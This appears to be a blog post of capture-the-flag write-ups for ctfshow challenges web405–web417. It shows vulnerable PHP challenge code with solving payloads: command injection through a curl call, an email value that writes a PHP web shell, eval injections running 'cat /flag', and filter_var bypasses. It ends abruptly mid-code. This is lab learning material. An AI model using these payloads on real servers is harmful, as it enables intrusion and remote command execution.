<h1 id="405"><a href="#405" class="headerlink" title="405"></a>405</h1><h1 id="web405"><a href="#web405" class="headerlink" title="web405"></a>web405</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"> Author: h1xa</span></span><br><span class="line"><span class="comment"> Date:   2021-01-15 16:38:07</span></span><br><span class="line"><span class="comment"> Last Modified by:   h1xa</span></span><br><span class="line"><span class="comment"> Last Modified time: 2021-01-15 19:20:10</span></span><br><span class="line"><span class="comment"> email: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"> link: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$url</span> = <span class="title function_ invoke__">parse_url</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>]);</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/((2[0-4]\d|25[0-5]|[01]?\d\d?)\.)&#123;3&#125;(2[0-4]\d|25[0-5]|[01]?\d\d?)./&#x27;</span>, <span class="variable">$url</span>[<span class="string">&#x27;host&#x27;</span>]))&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^\/[A-Za-z0-9]+$/&#x27;</span>, <span class="variable">$url</span>[<span class="string">&#x27;path&#x27;</span>]))&#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/\~|\.|php/&#x27;</span>, <span class="variable">$url</span>[<span class="string">&#x27;scheme&#x27;</span>]))&#123;</span><br><span class="line">                <span class="title function_ invoke__">shell_exec</span>(<span class="string">&#x27;curl &#x27;</span>.<span class="variable">$url</span>[<span class="string">&#x27;scheme&#x27;</span>].<span class="variable">$url</span>[<span class="string">&#x27;host&#x27;</span>].<span class="variable">$url</span>[<span class="string">&#x27;path&#x27;</span>]);</span><br><span class="line">            &#125;</span><br><span class="line">            </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;parse_url 好强大&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line">parse_url 好强大</span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?url=httphp:<span class="comment">//127.0.0.1111;echo `cat f*`&gt;1.txt;11/a</span></span><br></pre></td></tr></table></figure>

<h1 id="web406"><a href="#web406" class="headerlink" title="web406"></a>web406</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"> Author: h1xa</span></span><br><span class="line"><span class="comment"> Date:   2021-01-16 14:58:50</span></span><br><span class="line"><span class="comment"> Last Modified by:   h1xa</span></span><br><span class="line"><span class="comment"> Last Modified time: 2021-01-16 16:00:51</span></span><br><span class="line"><span class="comment"> email: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"> link: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">require</span> <span class="string">&#x27;config.php&#x27;</span>;</span><br><span class="line"><span class="comment">//flag in db</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$url</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">filter_var</span> (<span class="variable">$url</span>,FILTER_VALIDATE_URL))&#123;</span><br><span class="line">    <span class="variable">$sql</span> = <span class="string">&quot;select * from links where url =&#x27;<span class="subst">&#123;$url&#125;</span>&#x27;&quot;</span>;</span><br><span class="line">    <span class="variable">$result</span> = <span class="variable">$conn</span>-&gt;<span class="title function_ invoke__">query</span>(<span class="variable">$sql</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;不通过&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">Notice: Undefined index: url in /<span class="keyword">var</span>/www/html/index.php on line <span class="number">17</span></span><br><span class="line">不通过</span><br></pre></td></tr></table></figure>

<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/lxfweb/p/13757525.html">PHP代码审计02之filter_var()函数缺陷</a></p>
<h1 id="web407"><a href="#web407" class="headerlink" title="web407"></a>web407</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"> Author: h1xa</span></span><br><span class="line"><span class="comment"> Date:   2021-01-16 14:58:50</span></span><br><span class="line"><span class="comment"> Last Modified by:   h1xa</span></span><br><span class="line"><span class="comment"> Last Modified time: 2021-01-16 17:24:13</span></span><br><span class="line"><span class="comment"> email: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"> link: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="variable">$ip</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;ip&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">filter_var</span> (<span class="variable">$ip</span>,FILTER_VALIDATE_IP))&#123;</span><br><span class="line">    <span class="title function_ invoke__">call_user_func</span>(<span class="variable">$ip</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">cafe</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">add</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>IPv6的128位地址通常写成8组，每组为四个十六进制数的形式。比如：AD80:0000:0000:0000:ABAA:0000:00C2:0002  是一个合法的IPv6地址。这个地址比较长，看起来不方便也不易于书写。零压缩法可以用来缩减其长度。如果几个连续段位的值都是0，那么这些0就可以简单的以::来表示</p>
<p>被认为是ipv6地址</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?ip=cafe::<span class="variable constant_">add</span></span><br></pre></td></tr></table></figure>

<h1 id="web408"><a href="#web408" class="headerlink" title="web408"></a>web408</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"> Author: h1xa</span></span><br><span class="line"><span class="comment"> Date:   2021-01-16 14:58:50</span></span><br><span class="line"><span class="comment"> Last Modified by:   h1xa</span></span><br><span class="line"><span class="comment"> Last Modified time: 2021-01-16 19:53:18</span></span><br><span class="line"><span class="comment"> email: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"> link: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="variable">$email</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;email&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">filter_var</span> (<span class="variable">$email</span>,FILTER_VALIDATE_EMAIL))&#123;</span><br><span class="line">    <span class="title function_ invoke__">file_put_contents</span>(<span class="title function_ invoke__">explode</span>(<span class="string">&#x27;@&#x27;</span>, <span class="variable">$email</span>)[<span class="number">1</span>], <span class="title function_ invoke__">explode</span>(<span class="string">&#x27;@&#x27;</span>, <span class="variable">$email</span>)[<span class="number">0</span>]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">email=<span class="string">&quot;&lt;?=system(<span class="subst">$_POST</span>[1]);?&gt;&quot;</span>@<span class="number">123</span>.php</span><br></pre></td></tr></table></figure>

<p>非法字符可以放在双引号里面绕过检测</p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220415130131892.png" alt="image-20220415130131892"></p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220415130222833.png" alt="image-20220415130222833"></p>
<h1 id="web409"><a href="#web409" class="headerlink" title="web409"></a>web409</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"> Author: h1xa</span></span><br><span class="line"><span class="comment"> Date:   2021-01-16 14:58:50</span></span><br><span class="line"><span class="comment"> Last Modified by:   h1xa</span></span><br><span class="line"><span class="comment"> Last Modified time: 2021-01-16 20:26:16</span></span><br><span class="line"><span class="comment"> email: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"> link: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="variable">$email</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;email&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">filter_var</span> (<span class="variable">$email</span>,FILTER_VALIDATE_EMAIL))&#123;</span><br><span class="line">    <span class="variable">$email</span>=<span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/.flag/&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$email</span>);</span><br><span class="line">    <span class="keyword">eval</span>(<span class="variable">$email</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>@后面是不符合php语句格式的字符尝试闭合网页当中前面的&lt;?php</p>
<p>可行但是发现前面的”也是非法的<br>题目有个替换为.flag也就是把flag和它前面那个字符替换为空，这就可以把emai当中前面双引号这个非法字符给替换掉，避免在php环境里面出错</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?email=<span class="string">&quot;flagsystem(<span class="subst">$_POST</span>[1]);?&gt;&quot;</span>@<span class="number">123</span>.com</span><br><span class="line">POST</span><br><span class="line"><span class="number">1</span>=cat /flag</span><br></pre></td></tr></table></figure>

<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220415130816722.png" alt="image-20220415130816722"></p>
<h1 id="web410"><a href="#web410" class="headerlink" title="web410"></a>web410</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"> Author: h1xa</span></span><br><span class="line"><span class="comment"> Date:   2021-01-25 23:07:21</span></span><br><span class="line"><span class="comment"> Last Modified by:   h1xa</span></span><br><span class="line"><span class="comment"> Last Modified time: 2021-01-26 13:12:41</span></span><br><span class="line"><span class="comment"> email: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"> link: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line"><span class="variable">$b</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;b&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">filter_var</span> (<span class="variable">$b</span>,FILTER_VALIDATE_BOOLEAN))&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$b</span>==<span class="string">&#x27;true&#x27;</span> || <span class="title function_ invoke__">intval</span>(<span class="variable">$b</span>)&gt;<span class="number">0</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;FLAG NOT HERE&#x27;</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">定义和用法</span><br><span class="line">FILTER_VALIDATE_BOOLEAN 过滤器把值作为布尔选项来验证。</span><br><span class="line"></span><br><span class="line">Name: <span class="string">&quot;boolean&quot;</span></span><br><span class="line">ID-number: <span class="number">258</span></span><br><span class="line">可能的返回值：</span><br><span class="line"></span><br><span class="line">如果是 <span class="string">&quot;1&quot;</span>, <span class="string">&quot;true&quot;</span>, <span class="string">&quot;on&quot;</span> 以及 <span class="string">&quot;yes&quot;</span>，则返回 <span class="literal">true</span>。</span><br><span class="line">如果是 <span class="string">&quot;0&quot;</span>, <span class="string">&quot;false&quot;</span>, <span class="string">&quot;off&quot;</span>, <span class="string">&quot;no&quot;</span> 以及 <span class="string">&quot;&quot;</span>，则返回 <span class="literal">false</span>。</span><br><span class="line">否则返回 <span class="literal">NULL</span>。</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?b=yes</span><br></pre></td></tr></table></figure>

<h1 id="web411"><a href="#web411" class="headerlink" title="web411"></a>web411</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"> Author: h1xa</span></span><br><span class="line"><span class="comment"> Date:   2021-01-25 23:07:21</span></span><br><span class="line"><span class="comment"> Last Modified by:   h1xa</span></span><br><span class="line"><span class="comment"> Last Modified time: 2021-01-26 13:12:41</span></span><br><span class="line"><span class="comment"> email: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"> link: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line"><span class="variable">$b</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;b&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">filter_var</span> (<span class="variable">$b</span>,FILTER_VALIDATE_BOOLEAN))&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$b</span>==<span class="string">&#x27;true&#x27;</span> || <span class="title function_ invoke__">intval</span>(<span class="variable">$b</span>)&gt;<span class="number">0</span> ||<span class="variable">$b</span>==<span class="string">&#x27;on&#x27;</span> || <span class="variable">$b</span>==<span class="string">&#x27;ON&#x27;</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;FLAG NOT HERE&#x27;</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?b=yes</span><br></pre></td></tr></table></figure>

<h1 id="web412"><a href="#web412" class="headerlink" title="web412"></a>web412</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"> Author: h1xa</span></span><br><span class="line"><span class="comment"> Date:   2021-01-25 23:07:21</span></span><br><span class="line"><span class="comment"> Last Modified by:   h1xa</span></span><br><span class="line"><span class="comment"> Last Modified time: 2021-01-26 16:19:28</span></span><br><span class="line"><span class="comment"> email: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"> link: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$ctfshow</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;ctfshow&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$ctfshow</span>))&#123;</span><br><span class="line">    <span class="title function_ invoke__">file_put_contents</span>(<span class="string">&#x27;flag.php&#x27;</span>, <span class="string">&#x27;//&#x27;</span>.<span class="variable">$ctfshow</span>,FILE_APPEND);</span><br><span class="line">    <span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">ctfshow=<span class="meta">?&gt;</span><span class="meta">&lt;?php</span> <span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="number">1</span>]);&amp;<span class="number">1</span>=<span class="title function_ invoke__">system</span>(<span class="string">&#x27;cat flag.php&#x27;</span>);</span><br></pre></td></tr></table></figure>

<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220415132225921.png" alt="image-20220415132225921"></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">ctfshow=%<span class="number">0</span>asystem(<span class="string">&#x27;tac f*&#x27;</span>);</span><br></pre></td></tr></table></figure>

<h1 id="web413"><a href="#web413" class="headerlink" title="web413"></a>web413</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"> Author: h1xa</span></span><br><span class="line"><span class="comment"> Date:   2021-01-25 23:07:21</span></span><br><span class="line"><span class="comment"> Last Modified by:   h1xa</span></span><br><span class="line"><span class="comment"> Last Modified time: 2021-01-26 16:19:28</span></span><br><span class="line"><span class="comment"> email: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"> link: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$ctfshow</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;ctfshow&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$ctfshow</span>))&#123;</span><br><span class="line">        <span class="title function_ invoke__">file_put_contents</span>(<span class="string">&#x27;flag.php&#x27;</span>, <span class="string">&#x27;/*&#x27;</span>.<span class="variable">$ctfshow</span>.<span class="string">&#x27;*/&#x27;</span>,FILE_APPEND);</span><br><span class="line">    <span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Notice: Undefined index: ctfshow in /<span class="keyword">var</span>/www/html/index.php on line <span class="number">16</span></span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">ctfshow=/<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="number">1</span>]);/&amp;<span class="number">1</span>=<span class="title function_ invoke__">system</span>(‘cat flag.php’);</span><br></pre></td></tr></table></figure>

<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220415133217378.png" alt="image-20220415133217378"></p>
<h1 id="web414"><a href="#web414" class="headerlink" title="web414"></a>web414</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"> Author: h1xa</span></span><br><span class="line"><span class="comment"> Date:   2021-01-25 23:07:21</span></span><br><span class="line"><span class="comment"> Last Modified by:   h1xa</span></span><br><span class="line"><span class="comment"> Last Modified time: 2021-01-26 16:43:53</span></span><br><span class="line"><span class="comment"> email: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"> link: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line"><span class="variable">$ctfshow</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;ctfshow&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$ctfshow</span>==<span class="literal">true</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">sqrt</span>(<span class="variable">$ctfshow</span>)&gt;=<span class="title function_ invoke__">sqrt</span>(<span class="title function_ invoke__">intval</span>(<span class="variable">$flag</span>)))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;FLAG_NOT_HERE&#x27;</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">Notice: Undefined index: ctfshow in /<span class="keyword">var</span>/www/html/index.php on line <span class="number">16</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?ctfshow=-1</span><br></pre></td></tr></table></figure>

<p>sqrt() 函数返回一个数的平方根。</p>
<p> 返回 number 的平方根，如果 number 是负数则返回 NAN。</p>
<h1 id="web415"><a href="#web415" class="headerlink" title="web415"></a>web415</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"> Author: h1xa</span></span><br><span class="line"><span class="comment"> Date:   2021-01-25 23:07:21</span></span><br><span class="line"><span class="comment"> Last Modified by:   h1xa</span></span><br><span class="line"><span class="comment"> Last Modified time: 2021-01-26 19:15:52</span></span><br><span class="line"><span class="comment"> email: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"> link: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$k</span> = <span class="variable">$_GET</span>[k];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getflag</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$k</span>==<span class="string">&#x27;getflag&#x27;</span>)&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;FLAG_NOT_HERE&#x27;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">call_user_func</span>(<span class="variable">$k</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?k=getflaG</span><br></pre></td></tr></table></figure>

<h1 id="web416"><a href="#web416" class="headerlink" title="web416"></a>web416</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"> Author: h1xa</span></span><br><span class="line"><span class="comment"> Date:   2021-01-25 23:07:21</span></span><br><span class="line"><span class="comment"> Last Modified by:   h1xa</span></span><br><span class="line"><span class="comment"> Last Modified time: 2021-01-26 19:54:23</span></span><br><span class="line"><span class="comment"> email: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"> link: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctf</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getflag</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;fake flag&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">final</span> <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">flag</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">show</span> <span class="keyword">extends</span> <span class="title">ctf</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$f</span></span>)</span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">call_user_func</span>(<span class="variable">$f</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="keyword">new</span> <span class="title class_">show</span>(<span class="variable">$_GET</span>[f]);</span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?f=ctf::<span class="variable constant_">flag</span></span><br></pre></td></tr></table></figure>

<h1 id="web417"><a href="#web417" class="headerlink" title="web417"></a>web417</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span> <span class="comment">/*ctfshow*/</span></span><br><span class="line"><span class="title function_ invoke__">define</span>(<span class="string">&#x27;aPeKTP0126&#x27;</span>, <span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$cIYMfW</span> = <span class="title function_ invoke__">urldecode</span>(<span class="string">&quot;%6E1%7A%62%2F%6D%615%5C%76%740%6928%2D%70%78%75%71%79%2A6%6C%72%6B%64%679%5F%65%68%63%73%77%6F4%2B%6637%6A&quot;</span>);</span><br><span class="line"><span class="variable">$CBhSfw</span> = <span class="variable">$cIYMfW</span>[<span class="number">3</span>] . <span class="variable">$cIYMfW</span>[<span class="number">6</span>] . <span class="variable">$cIYMfW</span>[<span class="number">33</span>] . <span class="variable">$cIYMfW</span>[<span class="number">30</span>];</span><br><span class="line"><span class="variable">$xWoIVy</span> = <span class="variable">$cIYMfW</span>[<span class="number">33</span>] . <span class="variable">$cIYMfW</span>[<span class="number">10</span>] . <span 